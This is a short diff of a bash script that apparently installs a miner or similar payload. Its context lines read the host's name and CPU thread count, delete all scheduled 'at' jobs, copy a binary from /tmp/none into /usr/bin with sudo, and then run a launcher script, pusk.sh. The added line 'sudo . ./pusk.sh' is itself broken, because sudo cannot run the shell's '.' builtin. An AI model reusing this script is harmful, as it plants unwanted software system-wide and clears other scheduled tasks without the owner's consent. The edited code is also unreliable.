@@ -1,5 +1,4 @@
 #!/bin/bash
-dos2unix
 ID="$(hostname)"
 THREADS="$(nproc --all)"
 for i in `atq | awk '{print $1}'`;do atrm $i;done
@@ -23,4 +22,4 @@ chmod +x /tmp/none/$MNRCO
 sudo cp /tmp/none/$MNRCO /usr/bin/$MNRCO
 sleep 3
 sudo dos2unix pusk.sh
-. ./pusk.sh
+sudo . ./pusk.sh
